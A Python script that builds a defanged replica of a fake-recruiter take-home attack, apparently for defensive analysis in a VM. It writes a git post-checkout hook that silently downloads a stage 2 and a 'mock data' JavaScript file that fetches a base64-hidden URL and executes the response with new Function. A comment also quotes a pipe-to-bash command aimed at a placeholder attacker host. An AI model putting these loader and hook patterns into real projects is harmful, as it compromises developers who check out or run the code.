"""python3 mock_recruiter.py OUT.zip    build a harmless copy of the fake-recruiter take-home (git hook + base64 backdoor).

Same shape as the real case: README says `git checkout video`, a post-checkout hook downloads a "stage 2", and
backend/src/data/mockData.js hides a base64 URL that the server fetches and runs through new Function.
Harmless: stage 2 is example.com (static HTML: nothing to run, the hook saves it instead of piping it to bash),
the hook also pokes one host port, and nothing is sent out. Build and scan it anywhere; run it ONLY in the VM.
"""
import base64
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

STAGE2 = "https://example.com/api/terminal/script?flag=7"
HOOK = """#!/bin/sh
# real case: wget -q0- 'https://<attacker>/bootstrap?os=linux' | bash. Here the download is saved, not run.
(curl -fsS -m 8 'https://example.com/api/terminal/bootstrap?os=linux&flag=7' > .stage2.out
 curl -s -m 3 -o /dev/null http://192.168.56.1:7070/ ; echo "host port: $?" > .hook-ran) >/dev/null 2>&1 &
"""
MOCK = f"""const users = [{{ id: 1, name: "ada" }}, {{ id: 2, name: "linus" }}];
const agents = [{{ id: 1, name: "planner" }}, {{ id: 2, name: "coder" }}];
fetch(atob("{base64.b64encode(STAGE2.encode()).decode()}"))
  .then(res => res.text())
  .then(response => new Function("require", response)(require))
  .catch(e => console.log("stage2:", e.constructor.name));
module.exports = {{ users, agents }};
"""


def build(out):
    with tempfile.TemporaryDirectory() as d:
        r = Path(d)
        (r / "backend/src/data").mkdir(parents=True)
        (r / "README.md").write_text("Review this project in order:\n\n    git checkout video\n    git checkout doc\n    git checkout codebase\n")
        (r / "package.json").write_text('{"name":"daam","scripts":{"dev":"node backend/server.js"}}\n')
        (r / "backend/server.js").write_text('const { users } = require("./src/data/mockData");\nconsole.log("server up,", users.length, "users");\n')
        (r / "backend/src/data/mockData.js").write_text(MOCK)
        git = ["git", "-C", d, "-c", "user.name=x", "-c", "user.email=x@x"]
        for cmd in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-q", "-m", "upload"], ["branch", "video"]):
            subprocess.run(git + cmd, check=True, capture_output=True)
        hook = r / ".git/hooks/post-checkout"
        hook.write_text(HOOK)
        hook.chmod(0o755)
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for p in sorted(r.rglob("*")):
                if p.is_file():
                    z.write(p, p.relative_to(r))


if __name__ == "__main__":
    build(sys.argv[1])
